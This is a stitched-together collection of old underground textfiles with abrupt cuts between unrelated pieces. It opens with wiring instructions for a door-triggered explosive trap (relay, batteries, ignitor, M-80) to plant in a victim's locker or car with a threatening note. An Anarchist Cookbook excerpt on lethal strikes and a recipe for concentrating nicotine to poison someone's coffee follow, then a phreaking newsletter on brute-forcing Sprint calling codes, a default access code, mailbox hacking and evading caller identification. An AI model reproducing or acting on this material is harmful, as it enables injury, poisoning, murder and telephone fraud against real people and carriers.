(direct) confrontation.  But as he laughs in your face, you smile
inwardly---your revenge is already planned.
Step 1:  follow your victim to his locker, car, or house.  Once you
have chosen your target site, lay low for a week or more,
letting your anger boil.
Step 2:  in the mean time, assemble your versatile terrorist
kit(details below.)
Step 3:  plant your kit at the designated target site on a monday
morning between the hours of 4:00 am and 6:00 am.  Include a
calm, suggestive note that quietly hints at the possibility
of another attack.  Do not write it by hand!  An example of
an effective note:
  "don't be such a jerk, or the next one will take off your
   hand.  Have a nice day."
Notice how the calm tone instills fear.  As if written by a
homicidal psychopath.
Step 5:  choose a strategic location overlooking the target site.  Try
to position yourself in such a way that you can see his facial contortions.
Step 6:  sit back and enjoy the fireworks! Assembly of the versatile,
economic, and effective terrorist kit #1: the parts you'll need are:
1) 4 aa batteries
2) 1 9-volt battery
3) 1 spdt mini relay (radio shack)
4) 1 rocket engine(smoke bomb or m-80)
5) 1 solar ignitor (any hobby store)
6) 1 9-volt battery connector


Step 1:  take the 9-volt battery and wire it through the relay's coil.
This circuit should also include a pair of contacts that when
separated cut off this circuit.  These contacts should be held together
by trapping them between the locker,mailbox, or car door.
Once the door is opened, the contacts fall apart and the 9-volt circuit
is broken, allowing the relay to fall to the closed postion
thus closing the ignition circuit. (If all this is confusing take a
look at the schematic below.)

Step 2:  take the 4 aa batteries and wire them in succession.
Wire the positive terminal of one to the negative terminal of another,
until all four are connected except one positive terminal and one negative
terminal.  Even though the four aa batteries only combine to create 6
volts, the increase in amperage is necessary to activate the solar
ignitor quickly and effectively.

Step 3:  take the battery pack (made in step 2) and wire one end of it
to the relay's single pole and the other end to one prong of the solar
ignitor.  Then wire the other prong of the solar ignitor back to the open
position on the relay.

Step 4:  using double sided carpet tape mount the kit in his locker,
mailbox, or car door. And last, insert the solar ignitor into the
rocket engine (smoke bomb or m-80).



Your kit is now complete!

            AN EXCERPT FROM THE ANARCHISTS COOKBOOK II.....
                         Courtesy of Exodus

This file will explain the basics of hand-to-hand combat, and will tell
of the best places to strike and kill an enemy...
When engaged in hand-to-hand combat, your life is always at stake.
There is only one purpose in combat, and that is to kill your enemy.
Never face an enemy with the idea of knocking him out.
The chances are extremely good that he will kill YOU instead.
When a weapon is not available, one must resort to the full
use of his natural weapons. The natural weapons are:

1. The knife edge of your hands.
2. Fingers folded at the second joint or knuckle.
3. The protruding knuckle of your second finger.
4. The heel of your hand.
5. Your boot
6. Elbows
7. Knees
8. and Teeth.

Attacking is a primary factor. A fight was never 
won by defensive action. Attack with all of your strength.
At any point or any situation, some vulnerable point on your enemies
body will be open for attack. Do this while screaming as screaming has
two purposes.

1. To frighten and confuse your enemy.
2. To allow you to take a deep breath which, in turn, will put
more oxygen in your blood stream. Your balance and balance of your
enemy are two inportant factors; since, if you succeed in making
your enemy lose his balance, the chances are nine to
one that you can kill him in your next move. The best over-all
stance is where your feet are spread about shoulders width apart, 
with your right foot about a foot ahead of the left. Both arms
should be bent at the elbows parallel to each other. Stand on the
balls of your feet and bend your waist slightly. Kinda of like a
boxer's crouch. Employing a sudden movement or a scream or yell can
throw your enemy off-balance. There are many vulnerable points of
the body. We will cover them now:

Eyes:Use your fingers in a V-shape and attack in gouging motion.

Nose:(Extremely vulnerable) Strike with the knife edge of the hand
along the bridge, which will cause breakage, sharp pain, temporary
blindness, and if the blow is hard enough, death. Also, deliver a blow 
with the heel of your hand in an upward motion, thiswill shove the
bone up into the brain causing death.

Adam's Apple: This spot is usually pretty well protected, but if you
get the chance, strike hard with the knife edge of your hand. This
should sever the wind-pipe, and then it's all over in a matter of
minutes.

Temple: There is a large artery up here, and if you hit it hard
enough, it will cause death. If you manage to knock your enemy down,
kick him in the temple, and he'll never get up again.

Back of the Neck: A rabbit punch, or blow delivered to the base of
the neck can easily break it, but to be safe, it is better to
use the butt of a gun or some other heavy blunt object.
Upper lip: A large network of nerves are located. These nerves are
extrememly close to the skin. A sharp upward blow will cause extreme
pain, and unconciosness.

Ears: Coming up from behind an enemy and cupping the hands in a clapping
motion over the victims ears can kill him immediately. The vibrations
caused from the clapping motion will burst his eardrums, and cause 
internal bleeding in the brain.

Groin: A VERY vulnerable spot. If left open, get it with knee
hard, and he'll buckle over very fast.

Kidneys: A large nerve that branches off to the spinal cord comes very
close to the skin at the kidneys. A direct blow with the knife edge
of your hand can cause death.

There are many more ways to kill and injure an enemy, but these should
work best for the average person. This is meant only as information
and I would not recommend that you use this for a simple High School Brawl.
Use these methods only, in your opinion, if your life is in danger.
Any one of these methods could very easily kill or cause permanent damage
to someone. One more word of caution, you should practice these moves
before using them on a dummy, or a mock battle with a friend.
(You don't have to actually hit him to practice, just work on accuracy.)Nicotine                                      by the Jolly Roger

     Nicotine is an abundant poison. Easily found in tobacco 
products, in concentrated form a few drops can quickly kill 
someone. Here is how to concentrate it:

     First get a can of chewing tobacco or pipe tobacco. Remove 
the contents and soak in water overnight in a jar (about 2/3 cup 
of water will do...). In the morning, strain into another jar the 
mixture through a porous towel. Then wrap the towel around the 
ball of tobacco and squeeze it until all of the liquid is in the 
jar. Throw away the tobacco--you will not need it anymore.

     Now you have two options. I recommend the first. It makes the 
nicotine more potent.
     1) Allow to evaporate until a sticky syrup results in the 
jar. This is almost pure nicotine (hell, it is pure enough for 
sure!). 
     2) Heat over low flame until water is evaporated and a thick 
sticky syrup results (I don't know how long it takes... shouldn't 
take too long, though.).

     Now all you have to do, when you wish to use it, is to put 
a few drops in a medicine dropper or equivalent, and slip about 4 
or 5 drops into the victim's coffee. Coffee is recommended since it 
will disguise the taste. Since nicotine is a drug, the victim 
should get quite a buzz before they turn their toes up to the 
daisies, so to speak.

     Note: If the syrup is too sticky, dilute it with a few drops 
of water. And while you are at it, better add an extra drop to the 
coffee just to be sure!

                   Introduction
--------------------------------------------------------------------------
Welcome to the first issue of 'The Remote Informer'!  This newsletter
is reader supported.  If the readers of this newsletter do not help
support it, then it will end.  We are putting this out to help out the
ones that would like to read it.  If you are one of those who thinks they
know everything, then don't bother reading it.  This newsletter is not
anything like the future issues.  The future issues will contain several
sections, as long as reader input is obtained.  Below is an outline
overview of the sections in the future issues.

I/O Board (Input/Output Board)

The I/O Board is for questions you have, that we might be able to
answer or atleast refer you to someone or something.  We will be honest if
we cannot help you.  We will not make up something, or to the effect, just
to make it look like we answered you.  There will be a section in the I/O
Board for questions we cannot answer, and then the readers will have the
opportunity to answer it.  We will print anything that is reasonable in
the newsletter, even complaints if you feel like you are better than
everyone.

NewsCenter

This section will be for news around the underworld.  It will talk of
busts of people in the underworld and anything else that would be
considered news.  If you find articles in the paper, or something happens
in your local area, type it up, and upload it to one of the boards listed
at the end of the newsletter.  Your handle will be placed in the article.
If you do enter a news article, please state the date and from where you
got it.

Feature Section

The Feature Section will be the largest of the sections as it will be
on the topic that is featured in that issue.  This will be largely reader
input which will be sent in between issues.  At the end of the issue at
hand, it will tell the topic of the next issue, therefore, if you have
something to contribute, then you will have ample time to prepare your
article.

Hardware/Software Review
In this section, we will review the good and bad points of hardware
and software related to the underworld.  It will be an extensive review,
rather than just a small paragraph.

The Tops

This section will be the area where the top underworld BBS's, hacking
programs, modem scanners, etc. will be shown.  This will be reader
selected and will not be altered in anyway.  The topics are listed below.
Underworld BBS's (Hack, Phreak, Card, Anarchy, etc.)
Hacking programs for Hayes compatables
Hacking programs for 1030/Xm301 modems
Modem scanners for Hayes compatables
Modem scanners for 1030/Xm301 modems
Other type illegal programs
You may add topics to the list if enough will support it.

Tid Bits

This will contain tips and helpful information sent in by the users.
If you have any information you wish to contribute, then put it in a text
file and upload it to one of the BBS's listed at the end of the
newsletter.
Please, no long distance codes, mainframe passwords, etc.
We may add other sections as time goes by.  This newsletter will not
be put out on a regular basis.  It will be put out when we have enough
articles and information to put in it.  There may be up to 5 a month, but
there will always be at least one a month.  We would like you, the readers,
to send us anything you feel would be of interest to others, like hacking
hints, methods of hacking long distance companies, companies to card from,
etc.  We will maintain the newsletter as long as the readers support it.
That is the end of the introduction, but take a look at this newsletter,
as it does contain information that may be of value to you.

                      Hacking Sprint: The Easy Way
-------------------------------------------------------------------------
                             By: Tracker

If you hack US Sprint, 950-0777 (by the way it is no longer GTE
Sprint), and you are fustrated at hacking several hours only to find one
or two codes, then follow these tips, and it will increase your results
tremendously.  First, one thing that Mr. Mojo proved is that Sprint will
not store more than one code in every hundred numbers.  (ex: 98765400 to
98765499 may contain only one code).   There may NOT be a code in that
hundred, but there will never be more than one.
Sprint's 9 digit codes are stored from 500000000 through 999999999.
In the beginning of Sprint's 950 port, they only had 8 digit codes.  Then
they started converting to 9 digit codes, storing all 8 digit codes
between 10000000 and 49999999 and all 9 digit codes between 500000000 and
999999999.  Sprint has since cancelled most 8 digit codes, although there
are a few left that have been denoted as test codes.  Occaisionally, I
hear of phreaks saying they have 8 digit codes, but when verifying them,
the codes were invalid.
Now, where do you start?  You have already narrowed the low and high
numbers in half, therefore already increasing your chances of good results
by 50 percent.  The next step is to find a good prefix to hack.  By the
way, a prefix, in hacking terms, is the first digits in a code that can be
any length except the same number of digits the code is.  (ex: 123456789
is a code.  That means 1, 12, 123, 1234, 12345, 123456, 1234567, and
12345678 are prefixes)  The way you find a good prefix to hack is to
manually enter a code prefix.  If when you enter the code prefix and a
valid destination number and you do not hear the ringing of the recording
telling you that the code is invalid until near the end of the number,
then you know the prefix is valid.  Here is a chart to follow when doing
this:
Code      - Destination    Range good codes exist
-------------------------------------------------
123456789 - 6192R           123400000 - 123499999
123456789 - 619267R         123450000 - 123459999
123456789 - 61926702R       123456000 - 123456999
123456789 - 6192670293R     123456700 - 123456799
-------------------------------------------------
( R - Denotes when ring for recording starts)
To prove 
this true, I ran a test using OmniHack 1.3p, written by
Jolly Joe.  In this test I found a prefix where the last 3 digits were all
I had to hack.  I tested each hundred of the 6 digit prefix finding that
all but 4 had the ring start after the fourth digit was dialed in the
destination number.  The other four did not ring until I had finished the
entire code.  I set OmniHack to hack the prefix + 00 until prefix + 99.
(ex: xxxxxxy00 to xxxxxxy99: where y is one of the four numbers that the
ring did not start until the dialing was completed.)  Using this method, I
found four codes in a total of 241 attempts using ascending hacking (AKA:
Sequential).  Below you will see a record of my hack:
Range of hack            Codes found     Tries
----------------------------------------------
xxxxxx300 - xxxxxx399     xxxxxx350        50
xxxxxx500 - xxxxxx599     xxxxxx568        68
xxxxxx600 - xxxxxx699     xxxxxx646        46
xxxxxx800 - xxxxxx899     xxxxxx877        77
----------------------------------------------
Totals                     4 codes        241
As you see, these methods work.  Follow these guidlines and tips and
you should have an increase in production of codes in the future hacking
Sprint.  Also, if you have any hints/tips you think others could benefit
from, then type them up and upload them to one of the boards at the end of
the newsletter.

                         Rumors: Why Spread Them?
--------------------------------------------------------------------------
                              By: Tracker
Do you ever get tired of hearing rumors?  You know, someone gets an
urge to impress others, so they create a rumor that some long distance
company is now using tracing equipment.  Why start rumors?  It only scares
others out of phreaking, and then makes you, the person who started the
rumor, look like Mr. Big.  This article is short, but it should make you
aware of the rumors that people spread for personal gain.  The best thing
to do is to denote them as a rumor starter and then leave it at that.  You
should not rag on them constantly, since if the other users cannot
determine if it is fact or rumor, then they should suffer the
consequences.
==========================================================================
                     The New Sprint FON Calling Cards
--------------------------------------------------------------------------
                               By: Tracker
US Sprint has opened up a new long distance network called the Fiber
Optic Network (FON), in which subscribers are given calling cards.  These
calling cards are 14 digits, and though, seem randomly generated, they are
actually encrypted.  The rumors floating around about people getting
caught using the Sprint FON calling cards are fact, not rumors.  The
reason people are getting caught is that they confuse the FON calling
cards with the local 950 port authorization codes.  If you will remember,
you never use AT&T calling cards from you home phone.  It has ANI
capability, which is not tracing, but rather the originating phone number
is placed on the bill as soon as the call is completed.  They know your
phone number when you call the 800 access port, but they do not record it
until your call is completed.  Also, through several of my hacks, I came
up with some interesting information surrounding the new Sprint network.
They are listed below.
800-877-0000
This number is for information on US Sprint's 800 calling card
service.  I have not played around with it, but I believe it is for
trouble or help with the FON calling cards.  I am not sure if it is for
subscribing to the FON network.
800-877-0002 - You hear a short tone, then nothing.
800-877-0003 - US Sprint Alpha Test Channel #1
800-877-(0004-0999)
When you call these numbers, you get a recording saying: "Welcome to
US Sprint's 1 plus service."  When the recording stops, if you hit the
pound key (#) you will get the calling card dial tone.
Other related Sprint numbers
800-521-4949   This is the number that you subscribe to US Sprint with.
You may also subscribe to the FON network on this number.  It will take 4
to 5 weeks for your calling card to arrive.
10777
This is US Sprint's equal access number.  When you dial this number,
you then dial the number you are calling, and it will be billed through US
Sprint, and you will receive their long distance line for that call.  Note
that you will be billed for calls made through equal access.  Do not
mistake it to be a method of phreaking, unless used from a remote
location.
If you are in US Sprint's 1+ service then call 1+700-555-1414, which
will tell you which long distance company you are using.  When you hear:
"Thank you for choosing US Sprint's 1 plus service," hit the pound key
(#), and then you will get the US Sprint dial tone.  This however is just
the same as if you are calling from your home phone if you dial direct, so
you would be billed for calls made through that, but there are ways to use
this to your advantage as in using equal access through a PBX.
==========================================================================
                   Automatic Number Identification (ANI)
--------------------------------------------------------------------------
                             By: Tracker

The true definition for Automatic Number Identification has not been
widely known to many.  Automatic Number Identification, (AKA: ANI), is the
process of the destination number knowing the originating number, which is
where you are calling from.  The method of achieving this is to send the
phone number that you are calling from in coded form ahead of the
destination number. Below is an example of this.
ANI Method
Dial: 267-0293
Sent: ********2670293
* - Denotes the originating number which is coded and sent before the
    number
As you noticed there are 8 digits in the coded number.  This is
because, at least I believe, it is stored in a binary-like form. 
Automatic Number Identification means a limited future in phreaking. ANI
does not threaten phreaking very much yet, but it will in the near future.
A new switching system will soon be installed in most cities that are
covered by ESS, Electronic Switching System, now. 
The system will have ANI capabilities which will be supplied to the
owners of phone lines as anadded extra.  The owner's phone will have
an LED read-out that will show the phone number of the people that
call you.  You will be able to block some numbers, so that people
cannot call you.  This system is in the testing stages currently, but will
soon be installed across most of the country.  As you see, this will
end a large part of phreaking, until we, the phreakers, can come up with
an alternative.  As I have been told by several, usually reliable,
people, this system is called ISS, which I am not sure of the meaning of
this, and is being tested currently in Rhode Island.
800 in-watts lines set up by AT&T support ANI.  The equipment to
decode an ANI coded origination number does not costs as much as you would
expect.  950 ports do not offer ANI capability, no matter what you have
been told.  The 950 ports will only give the city in which they are based,
this usually being the largest in the state, sometimes the capitol.
One last thing that I should tell you is that ANI is not related to
tracing.  Tracing can be done on any number whether local, 950, etc.  One
way around this, especially when dialing Alliance TeleConferencing, is to
dial through several extenders or ports.  ANI will only cover the number
that is calling it, and if you call through a number that does not support
ANI, then your number will never be known.

                           Raggers and Braggers                           
==========================================================================
   This section is to make  you aware  of well-known raggers and braggers.
Since this is  the first time this  section is being printed, we will tell
you what classifies people as raggers and braggers.  In  the future issues
the top raggers and braggers will be  listed in this newsletter to let the
SysOps  know who not to let on their board, or to  atleast keep an eye on.
   A ragger is someone who will put someone else  down for something.  The
person might post a message  asking a novice  question  about hacking  and
phreaking, or may  say  something  that is completely wrong, and a  ragger
will  put the  other person  down for he said, posted, etc.  The ones that
usually classify in this category are the ones that think they know it all
and consider themselves right  no matter  what anyone  says.  Most  of the
users that  use codes and  consider  themselves a  master phreaker usually
become raggers.                                                         
   A bragger is someone who either does or thinks he does know everything,
and puts it upon himself to tell  the  whole  world that he  knows it all.
This  person is also  one who thinks he is better  than  everyone else and
he believes he is Elite, and no one else is.  People  who tend to  do this
are those who have, for some reason, become well-known in the  underworld,
and as  a result become a bragger.  Those  usually not too well-known will
not tend  to brag as  much as  those who think  everyone would  love to be
their friend and be like them.                         
   As a well-known ragger and  bragger, The Toad, learned that it does not
help to be one or both of those.  He  has since  changed and is now easily
accepted by  most.  Most people  disliked him because others they knew had
said something bad about him.  This  is called peer pressure and  is a bad
influence to those who  are new to the underworld.  I would suggest in the
future,  to not judge someone by what others  say, but rather by  how they
act around/to you. 
   The current  most  popular Atarian  that  classifies as a  ragger and a
bragger is Ace of Aces, and  is well-hated by many users and SysOps, since
he tends to put  down anything anyone  says and considers himself the best
at writing hacking programs.  He is commonly  referred to as  Ass of Asses
and Ass of Assholes.  Even holding an open  mind about this guy, you would
soon come to find that what others said  coincides  with what you see from
him.                                                                      
==========================================================================
                          A New 950 has arrived!                          
==========================================================================
   LDDS, who as  mentioned above bought out TMC, is  installing  a new 950
port to most major  cities.  By the time  you read  this, it should  be in
almost every area that supports 950 ports.  The number is  950-1450.  This
port will dial 976 numbers, but not 700, 800, or 900 numbers.  The dialing
method  for LDDS is:  7 digit code, then  even if the code is  bad it will
give you a dial tone.  Then  dial the area  code  plus the number.  If you
have a bad code it will simply say your call cannot be completed as it was
dialed.  There is a default code used on the system that  currently works.
The code is simply, 1234567.  I have seen codes from 5 different companies
and they all are in the format of 00xxxxx.  I do  not  know  what  type of
software they use, but I  will  know by  the next  issue exactly what they
place  on  the bills.  This  could  be  the  answer  to  alot  of people's
problems with fear of Sprint and ITT, especially  AllNets.  Just remember,
Tracker  is the one  who  found  this, and all  information  about it.  If
someone  is seen saying  they found  this, then they will be listed in the
next issue which will contain an article on leeches.                      
==========================================================================
                             Mailbox Systems                              
==========================================================================
   Mailbox systems are the link between information and the underworld. If
you have ever called one, then you will know the advantages of having one,
especially the ones that are  open to whole underworld, rather than just a
select few.  There are two types  of mailbox systems that are widely used.
   The first  type we will  talk about is the multiple mailbox systems, or
commonly referred to  as  message  systems.  These  systems  have several
mailboxes set up on one number.  Usually, you  can access other  mailboxes
from that  number  by  pressing '*' or '#'.  Sometimes you  just enter the
mailbox number and you are connected.  These are the safest systems to use
to protect information from US Sprint and other  long distance  companies.
Since US Sprint and other companies  call  the destination  numbers, it is
safer to  have 800 mailbox systems, and  most  of  the time, the  multiple
mailbox systems  are on 800 numbers.  The  passcode on  these  systems can
vary in length and can be accessed by several  different methods, so it is
impossible to explain exactly how to hack these systems.                  
   The other type is the single mailbox system.  These  are usually set up
in a reserved  prefix in an area  code.  (Ex: 713-684-6xxx)  These systems
are usually  controlled by the  same type of hardware/software.  To access
the area  where you  enter the  passcode, just hit '0' for a second or so.
The passcodes are  four (4)  digits  long.  The only way to hack  these is
manually.  The best thing you could do is to  find one that does not  have
a recording from a person, but just the  digitized voice.  If you hack one
that  someone already  owns, they will  report it and  it will not last as
long.                                                                     
   Here is a list mailboxes or prefixes to help you get started

It's been a month now, and ALOT has happened.  So much, in fact, that the
information will be split into several issues.  This should be no shock since
I mentioned in the first issue that we may put several issues out sometimes.
     I want to congratulate the readers for finally contributing to the

obtained.  Several people gave me information for these issues, and their
handle and information is included in the articles.

==============================================================================
     Starting from now on, we will have a BBS of the month.  We will choose a
BBS, ragardless of computer type, and look at the user participation in phreak
related matters, as well as quality discussions on the various illegal topics.
A BBS can remain the BBS of the month as long as they reside above the rest of
the BBS systems.  Even though we will sometimes bring out more than one issue
in a month, the board will remain BBS of the month until the first issue inthe
next month comes out.
     This month's BBS of the month is FBI PirateNet.  We chose this board
because of the large numbers of posts in the bases, and not only information,
but discussions as well, with a minimum number of posts from raggers and
braggers.  The number for it is 516-661-7360.  The SysOp of FBI PirateNet is

=           US Sprint Expected to Trim Staff, Consolidate Divisions          =
==============================================================================
     New York -- US Sprint Communications Corp., the troubled long distance
carrier, is expected to announce soon that it will cut its work force by
several hundred people and reduce its seven regional divisions to 3 operating
groups, sources familiar with the company said.
     The company's Pacific division is based in Burlingame, CA.  The layoffs
and reorganization are part of a plan by US Sprint's new president, Robert H.
Snedaker, to reduce heavy operating losses, which analysts expect to reach
more than $800 million this year.
     Snedaker replaced Charles M. Slibo, who was forced to resign in July
because losses were running much higher than the parent companies had
expected.  Problems with the company's computerized billing system also
contributed to Skibo's ouster.  US Sprint is owned and operated by the GTE
Corp. and United TeleCom.
     According to sources close to Snedaker, who was vice chairman and chief
operating officer of United TeleCom, he is planning to consolidate the
company's 7 divisions, which operate in the same geographical regions as the
seven regional Bell operating companies, into 3 divisions.
     The rationale for the move, according to idustry analysts, is that the
company will need a much smaller work force once it begins handling all it's
phone traffic on it's new fiber optic network, which can carry a greater
number of telephone calls at less cost.  Company officials have said that
they expect to have most of the traffic on the network by early next year.
     One source said that there would be more than one round of layoffs in the
coming months and that the company ultimately plans to reduce its 14,000
member work force by 15 percent.
     Several top managers are expected to resign as soon as US Sprint
centralizes its marketing and support operations as its headquarters in Kansas
City, MO., according to a report in the latest issue of Business Week
magazine.
     A spokesman for US Sprint said on Friday that the company would not
comment on the rumors.  The company is the nation's third largest long
distance company, after the American Telephone and Telegraph Co. (AT&T) and
MCI Communications Co.
     Last year, Washington based MCI undertook a similar reorganization in
which it posted a $502.5 million loss to write down old inventory and
restructure operations.
     Analysts said that is US Sprint is to turn a profit, the company must
increase its market share.  "To do this, US Sprint must gain more large
business customers, which account for about 80 percent of industry revenues,"
said Robert B. Morris III, Securities in San Francisco.
     Morris said that by using a slick marketing campaign to differentiate its
all-fiber telephone network from those of competitors, US Sprint more than
doubled its customer base last year.  But "most of these customers were
residential and small business users that added little to Sprint's bottom
line," he added.  "If the company expects to be profitable, it will have to
concentrate on providing the best service to volume users."

=             Secret Service Cracks Down on Teen Hackers                     =
==============================================================================
     Mount Lebanon, PA -- The US Secret Service and local police departments
have put a scare into the hacker community with a nationwide crackdown on
computer crime that has resulted in the arrests of teenage hackers in at least
three cities.
     "People who monitor the bulletin boards say there are a lot of nervous
hackers out there, wondering who will be arrested next," says Ronald E.
Freedman, vice-president of Advanced Information Management, a Woodbridge, VA
base computer security firm.
     Nine teenagers from Mount Lebanon Junior-Senior High School near
Pittsburg, PA, were arrested recently and charged with computer fraud.  The
juveniles allegedly used home computers to gain illegal access to a credit
card authorization center.  They obtained valid credit card numbers and used
them to purchase thousands of dollars worth of mail order merchandise, the
police said.
     Freedman says it appears the hackers used some relatively sophisticated
techniques in the scheme, including specially written software that enabled
them to bypass security controls and navigate through credit records to obtain
key information.
     Police officials say that the hackers also obtained access codes from
pirate bulletin board systems to make free long distance calls and gain access
to various business and government computers.
     The arrests were the result of a 6 week investigation by the Secret
Service and the Mount Lebanon police. The police were tipped off by parents
who were suspicious about how their son managed to obtain a skateboard valued
at $140.
     The Secret Service was also involved in investigations that led to the
arrests of several hackers in San Francisco and New York last July.
     Secret Service spokesman William Corbett says that although some reports
have portrayed the hackers as part of a national crime ring, the cases are
unrelated.  "It's just that a few of these computers hacking cases came to a
head at about the same time," he says.
     Federal Legislation enacted in 1984 gives the Secret Service, part of the
Department of the Treasury, a major role in investigating computer crimes.
Under the federal Computer Fraud and Abuse Act of 1986, computer fraud is a
felony that carries a maximum penalty of 5 years for the first offense, and 10
years for the second.  Displaying unauthorized passwords on hacking bulletin
boards carries a maximum penalty of 1 year in prison for the first offense,
and 10 years for the second.

=                          German Teens Crack NASA                           =
==============================================================================
     Washington, D.C. -- A group of West German teenagers from the Chaos
Computer Club penetrated a NASA network recently, saying they were doing it to
"test the security."
     What they got into was SPAN Net, a computer network with about 700 notes,
which is actually based at the Goddard Space Center in Maryland.  All that's
in there is unclassified data, space science information, and post-flight data
anaysis.  "Anyone with NASA related research can apply for access to SPAN"
says a spokesman, who adds that the network runs on DEC VAX hardware.  "We
picked up three attempts to gain access and put in security precautions so it
would't happen."  His personal opinion is, "We're happy that they couldn't get
back in, and decided to go public."  He also added that NASA has many other
networks, many of the classified and "probably inpenetrable.  But I do not
want to challenge anybody."
     How'd they get in?  Probably they got a West German NASA licensee, which
gave them a visitor's pass, then they created new passwords with unlimited
security for themselves, after which getting around the network was easy.

==============================================================================
     New Cannan, CT -- International Resource Develope of New Cannan, CT says
that the market bubble for packet switch networks like TeleNet is going to
burst by 1991, regardless of what the Federal Communications Commission does
about access charges.  Cheap fiber, which greatly increases the capacity, and
ISDN services, which let you share a phone line with your computer, will do
the business in, the report says.  Over the next four years, however, the
demand for packet switch services to will grow from $650 million to $1,612
million (If the Baby Bells are allowed to add competition to the market, the
$5/hour access charge cannot be passed though to the customers anyway).

of The Remote Informer.
     The long-awaited database will soon be put online.  Over 800 textfiles
on a variety of subjects will be available to the users that pay the access
fee that will be determined at a later date.  Many more are on the way, and
will be included at no charge. The charge will be a one time charge though,
rather than a yearly payment.
     Another new option will be available by early December.  PC Pursuit
callback will be installed.  This will allow people to call and then get
called back if your area code is supported by PC Pursuit.  This will also
require a charge, to be set at a later date.
     The Pirate's Hollow has been doing well in its comeback to the

=                               Switching Systems                            =
==============================================================================
     There are currently three different forms of switching systems that are
present in the United States today. Step by Step (SxS), Crossbar, and the
Electronic Switching System (ESS) make up the group.  Phreaks have always been
a little tenative when it comes to "doing their work" once they have heard
about effects of switching systems on their hobby.  After researching this
topic, I have found that there really is not that much to be worried about.
Read on, while I share with you information which I have compiled about all of
these switching systems and their distinct features.
     The first switching system that was used in the country was called Step
by Step.  This was adopted in 1918 by Bell, and until 1978, they had over 53%
of all their exchanges using Step by Step (SxS).  This system is known for
it's long, confusing train of switches that are used for its step by step
switching.
     Step by Step has many disadvantages to phone users.  The switch train
becomes jammed fairly often, and it causes calls to be blocked.  Also, SxS
does not allow the use of DTMF dialing. This accounts for some of the areas in
the United States that cannot have touch tone dialing abilities.  A tremendous
amount of electricity and maintenance needs to accompany the SxS switching
system, which makes it even more impratical.  All in all, this is probably the
most archaic switching system around.  
    There are a number of ways to see if you are on SxS.  You will notice that
there are no pulsing digits after dialing.  Most sources say that the phone
company will sound like many typewriters.  SxS does not offer features such as
speed calling, call forwarding, three-way calling, call waiting, and other
such services.  Pay phones on SxS also will want your money before you receive
a dial tone.  This adds to the list of disadvantages labelled to that of the
Step by Step switching systems.
     Another type of switching system that is prevalent in the United States
is Crossbar.  Crossbar has been Bell's primary switcher after 1960, and three
types of it exists.  Number 1 Crossbar (1xB), Number 4 Crossbar (4xB), and the
Number 5 Crossbar (5xB).  In Crossbar, a switching matrix is used for all the
phones in an area, and when someone calls, the route is determined and is met
up with the other phone.  This matrix is set-up in horizontal and vertical
paths.  Unlike other swichting systems, in my research, I could not come up
with any true and definate distinguishing features of the Crossbar switching
systems.
     The Electronic Switching System (ESS) is yet another switching system
used in the United States and the most used of all three swicthing systems.
ESS is an extremely advanced and multi-faced type of switching system, and is
feared by marauders of the phone company everywhere.  With ESS, your phone
company is able to know every digit dialed (including mistakes), who you call,
when you called, and how long you were connected.  ESS is also programmed to
print out the numbers of people who make excessive calls to WATS numbers (800
services) or directory assistance.  This feature of ESS is called 800
Exceptional Calling Report, and has spelled the end of some forms of
continuous code hacks to certain extenders.  ESS can also be programmed to
print logs of who called and abused certain numbers as well.  Everything is
kept track of in its records.
     The aforementioned facts show that ESS has made the jobs of organizations
such as the FBI, NSA, and other phone company security forces easier.  Tracing
can be done in a matter of microseconds, and the result will be conveniently
printed out on the monitor of a phone company officer.  ESS is also programmed
to pick up any "foreign tones" on the phone line such as the many varied tones
emulated by boxes.
     ESS can be identified by a few features common in it.  The 911 emergency
service is covered in the later versions of ESS.  Also, you are given the dial
tone first when using a pay phone unlike that of SxS.  Calling services like
call forwarding, speed calling, and call waiting are also common to ESS.  One
other feature common to ESS is ANI (Automatic Number Identification) for long
distance calls.  As you can see, ESS is basically the zenith of all switching
systems, and it will probably plague the entire country by the early 1990's.
Soon after, we should be looking forward to a system called CLASS.  This
switching system will contain the feature of having the number of the person
that is calling you printed out on your phone.
     What have I concluded about these switching systems?  Well, they are not
good enough.  I know a few people employed by the phone company, and I know
for a fact that they do not have enough time these days to worry about code
users, especially in large, metropolitan areas.  So, I will go out on a limb
here, and say that a large portion of people will never have to worry about
the horrors of ESS.

=                  New Gizmo Can Change Voice Gender                         =
==============================================================================
     The most amazing device has turned up in the new Hammacher Schlemmer
catalog:  the telephone voice gender changer.
     What it does is change the pitch of your voice from, say, soprano to bass
-- a most efficient way to dissuade an obscene phone caller just as he's
getting warmed up.
     That is not the same as running a 45 r.p.m. record at 33. In digital
conversion, the pitch can be changed without altering the speed.
     The device runs on a 9-volt batter and attaches to the telephone mouth
piece with a rubber coupler that takes but a moment to slip on and off.
     With the changer switched on, says Lloyd Gray, a Hammacher Schlemmer
technical expert, "the effect is similar to what you hear when they interview
an anonymous woman on television and disguise her voice by deepening it."
"It's better for changing a woman's voice to a man's than the other way
around," Gray said.  A man can use it to raise the pitch of his voice, but he
still won't sound like a woman."
     A man could, however, use the changer to disguise his voice. But with the
device set on high, Gray's voice still could be identified as his own. On low,
his normal tenor became so gravel like that the words were unintelligible.

=                                 AT&T Rates                                 =
==============================================================================
     WASHINGTON -- American Telephone & Telegraph Co. proposed Tuesday to
lower its interstate long-distance rates by an average of 3.6 percent to
reflect reduced costs in connecting to the local telephone network.
     The largest decrease -- 6.3 percent -- would be seen in day time prices
"because of the need to make those rates more competitive," AT&T said.
     Rates for calls made during evening hours would drop 2.2 percent and
calls made during the late night and weekends would be cut by 0.8 percent, the
company said.
     The rate reductions would take effect Jan. 1, if they are approved by the
Federal Communications Commission.
     Reacting to the proposed price cuts, MCI Communications Corp. and US
Sprint Communications Co., the nation's second-largest and third-largest long
distance companies respectively, said their response would depend on what the
FCC finally approves but both said they intended to remain competitive with
AT&T. AT&T, the nation's largest long-distance company, proposed to the FCC
that its rates drop as much as $800 million, but AT&T said the exact amount
will depend on the access charges the FCC allows the local telephone companies
to collect from long distance carriers, which must pay the fees to hook into
the phone local network.
     AT&T has challenged the new access rates filed by the regional Bell
operating companies, contending they are more than $1 billion too high.
In proposing its new rates, the long-distance leader told the FCC it
expects local companies' access fees to fall by at least $200 million -- which
would amount to an average rate reduction of less than 1 percent.  But the
company said it believes the FCC will order an additional $600 million in
reductions based on AT&T's challenge.
     "We're confident the FCC will recognize that access charges filed by the
local telephone companies need to be substantially reduced, which would mean
more savings for our customers," said Larry Garfinkel, AT&T vice president for
marketing.
     He said the company filed its proposed rates based on disputed charges
because "we wanted to let the public react ... and further to let the FCC have
full knowledge of where we were heading given our expectation that we had a
